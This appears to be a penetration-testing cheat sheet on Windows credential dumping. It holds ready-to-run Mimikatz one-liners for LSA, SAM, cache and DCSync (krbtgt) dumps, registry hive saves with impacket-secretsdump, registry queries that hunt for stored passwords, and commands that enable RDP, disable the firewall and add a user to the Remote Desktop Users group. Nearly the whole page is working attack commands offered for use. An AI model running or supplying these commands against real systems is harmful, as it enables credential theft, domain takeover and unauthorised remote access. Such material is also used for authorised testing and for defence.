# Credential Dumping

#### Mimikatz <a href="#mimikatz" id="mimikatz"></a>

```
# One liner dump hashes and secrets
.\mimikatz.exe "privilege::debug" "token::elevate" "log mimi.log" "sekurlsa::logonpasswords" "lsadump::lsa" "lsadump::sam" "lsadump::secrets" "lsadump::cache" exit

# One liner For DCsync hash dump
.\mimikatz.exe "log mimi2.log" "token::elevate" "privilege::debug" "lsadump::dcsync /domain:svcorp.com /user:krbtgt" "lsadump::dcsync /domain:svcorp.com /csv /all" exit

# Single commands
privilege::debug
token::elevate
log mimi.log
sekurlsa::logonpasswords
lsadump::lsa
lsadump::sam
lsadump::secrets
lsadump::cache
lsadump::dcsync /domain:svcorp.com /user:krbtgt
lsadump::dcsync /domain:svcorp.com /csv /all
```

#### Saved registry <a href="#saved-registry" id="saved-registry"></a>

```
reg.exe save hklm\sam c:\temp\sam.save  
reg.exe save hklm\security c:\temp\security.save  
reg.exe save hklm\system c:\temp\system.saveÂ 
```

```
impacket-secretsdump -sam sam.save -system system.save LOCAL
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

#### Stored Credentials <a href="#stored-credentials" id="stored-credentials"></a>

```
#RegistryÂ Registry can be queried as in some occasions might contain credentials.Â 
reg query HKLM /f password /t REG_SZ /s  
reg query HKCU /f password /t REG_SZ /sÂ 

#Windows AutologinÂ 
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Putty Credentials saved in the registry.
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# RealVNC stored password
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
```

> Reference: https://pentestlab.blog/2017/04/19/stored-credentials/

### Enable RDP <a href="#enable-rdp" id="enable-rdp"></a>

```
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

netsh advfirewall set allprofiles state off

net localgroup "remote desktop users" <username> /add
```
